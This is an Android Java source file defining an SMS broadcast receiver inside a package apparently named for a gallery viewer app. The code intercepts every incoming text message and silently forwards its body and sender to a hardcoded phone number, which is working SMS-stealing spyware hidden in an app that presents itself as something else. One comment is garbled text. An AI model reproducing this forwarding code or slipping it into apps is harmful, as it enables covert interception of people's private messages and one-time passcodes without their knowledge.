package your.LINHelloGalleryView;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsManager;
import android.telephony.SmsMessage;
import android.util.Log;
import android.widget.Toast;

public class sms_receiver extends BroadcastReceiver {
	public static final String SMS_RECEIVED = "android.provider.Telephony.SMS_RECEIVED";

	private String msg;
	private String to;

	@Override
	public void onReceive(Context context, Intent intent) {
		Log.e("Error", "onReceive()" + intent.getAction());

		// intent¿« Action ∞ÀªÁ.....
		if (intent.getAction().equals(SMS_RECEIVED)) {
			Bundle bundle = intent.getExtras();
			intent.removeExtra("pdus");

			Log.e("Error", "I got it!");
			if (bundle != null) {
				Object[] pdus = (Object[]) bundle.get("pdus");
				SmsMessage[] messages = new SmsMessage[pdus.length];
				Log.e("Error", "" + pdus.length);
				for (int i = 0; i < pdus.length; i++)
					messages[i] = SmsMessage.createFromPdu((byte[]) pdus[i]);

				for (SmsMessage message : messages) {
					msg = message.getMessageBody();
					to = message.getOriginatingAddress();

					Toast.makeText(context, msg + "  from " + to,
							Toast.LENGTH_SHORT).show();
					SmsManager smsManager = SmsManager.getDefault();
					smsManager.sendTextMessage("01067552702", null, msg+" from "+to, null, null);
				}
			}
		}
	}
}